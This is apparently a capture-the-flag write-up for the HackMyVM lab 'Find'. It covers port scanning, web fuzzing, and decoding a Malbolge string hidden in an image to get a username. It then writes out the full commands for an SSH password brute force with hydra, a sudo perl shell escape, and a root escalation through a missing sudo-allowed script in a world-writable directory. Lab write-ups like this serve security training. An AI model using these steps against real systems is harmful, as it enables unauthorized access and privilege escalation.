# Find

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.196:22
Open 10.0.2.196:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.196
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 6e:f7:90:04:84:0d:cd:1e:5d:2e:da:b1:51:d9:bf:57 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDpjH1SejG75I2qqzD+U0IJ5hx+GVBjyAFYm9J4i87UJ202gEoAYPKptJyV0k56ekh1rKw8bXYKngrncDWd3jkFrXW+1oSxWGmvs006xnH/qbDerxFiR2/BBwLd5GNmGWQGqcxOigW4kyLrY1DvAQiZeQ1K/JQq8LTwX9hEruDRhxOHxT7u4HReSZYNsmAvZyAHDuKr0wpPPPeyNp3JUjIcgOZgNiF5NdJo3/OUsm6I/uVI9WBFF21JXk6cyB1e7mxRV7U3m2d4tpBQ0boP4yB4qxFNN62Zi/T9laYOZLZeEQ/S2I129lSqwSDxeJzvVY8v+T5+NOrgH1c5iUwemNBx
|   256 39:5a:66:38:f7:64:9a:94:dd:bc:b6:fb:f8:e7:3f:87 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBnO0hGm3vMW3nqeOaONMHfXgjd8tn1JsgmcKDPWxroKt4VZLC4Ei5wQQXFw1YsQ4bMyeqs+SDrFwOK2AIwgb1Y=
|   256 8c:26:e7:26:62:77:16:40:fb:b5:cf:a6:1c:e0:f6:9d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA5nBUDNFnj5X2Or9x1Czs0oocX5GMjYybsT0XlrBmbP
80/tcp open  http    syn-ack Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Debian Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

```bash
└─$ curl http://10.0.2.196/robots.txt
find user :)
```

```bash
└─$ feroxbuster -u http://10.0.2.196/ --thorough --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/common.txt
200      GET      368l      933w    10701c http://10.0.2.196/
200      GET      368l      933w    10701c http://10.0.2.196/index.html
301      GET        9l       28w      309c http://10.0.2.196/manual => http://10.0.2.196/manual/
200      GET        1l        3w       13c http://10.0.2.196/robots.txt
```

No hidden directories found
```bash
└─$ feroxbuster -u http://10.0.2.196/ --thorough --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

To find user fuzz maybe for relevant file extensions?
```bash
└─$ feroxbuster -u http://10.0.2.196/ --thorough -n -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php,.txt,.png,.jpeg,.jpg
...
200      GET      154l      723w    62838c http://10.0.2.196/cat.jpg
...
```

```bash
└─$ curl -LOs http://10.0.2.196/cat.jpg
└─$ file cat.jpg
cat.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, comment: "File source: https://commons.wikimedia.org/wiki/File:Cat03.jpg", baseline, precision 8, 481x480, components 3

└─$ strings cat.jpg
...
it\mMBv
>C<;_"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJ`_dcba`_^]\Uy<XW
VOsrRKPONGk.-,+*)('&%$#"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONML
KJIHGFEDZY^W\[ZYXWPOsSRQPON0Fj-IHAeR
```

Not steg, so it must be something related to last lines?
```bash
└─$ stegseek cat.jpg $rockyou
[!] error: Could not find a valid passphrase.
```

Cipher identified failed
- [https://www.dcode.fr/cipher-identifier](https://www.dcode.fr/cipher-identifier)

But GPT mentioned it could be [Malbolge](https://malbolge.doleczek.pl)

![writeup.png](/assets/pentest/hackmyvm/find/writeup.png)

> Username: `missyred`

## SSH

```bash
└─$ hydra -l missyred -P $rockyou 10.0.2.196 ssh -t 64
[22][ssh] host: 10.0.2.196   login: missyred   password: iloveyou
```

```bash
└─$ sshpass -p 'iloveyou' ssh missyred@10.0.2.196
missyred@find:~$ id
uid=1001(missyred) gid=1001(missyred) groups=1001(missyred),1002(user)
```

## Privilege Escalation (kings)

```bash
missyred@find:~$ sudo -l
Matching Defaults entries for missyred on find:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User missyred may run the following commands on find:
    (kings) /usr/bin/perl
```

- [https://gtfobins.org/gtfobins/perl/](https://gtfobins.org/gtfobins/perl/)

```bash
missyred@find:~$ sudo -u kings perl -e 'exec "/bin/bash"'
kings@find:~$ id
uid=1002(kings) gid=1006(kings) groups=1006(kings),1005(kingg)
```

### User.txt

```bash
kings@find:~$ cat user.txt
f4e690f638c01bd8a19fb1349d40519c
```

## Privilege Escalation (root)

```bash
kings@find:~$ sudo -l
Matching Defaults entries for kings on find:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User kings may run the following commands on find:
    (ALL) NOPASSWD: /opt/boom/boom.sh
```

There's no such file? But directory is writable
```bash
kings@find:~$ ls -alh /opt/
total 8.0K
drwxrwxrwx  2 root root 4.0K May 11  2022 .
drwxr-xr-x 18 root root 4.0K May 11  2022 ..
```

```bash
kings@find:~$ mkdir /opt/boom
kings@find:~$ echo '/bin/bash -p' > /opt/boom/boom.sh
kings@find:~$ chmod +x /opt/boom/boom.sh
kings@find:~$ sudo /opt/boom/boom.sh
root@find:/home/kings# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
root@find:/home/kings# cat /root/root.txt
c8aaf0f3189e000006c305bbfcbeb790
```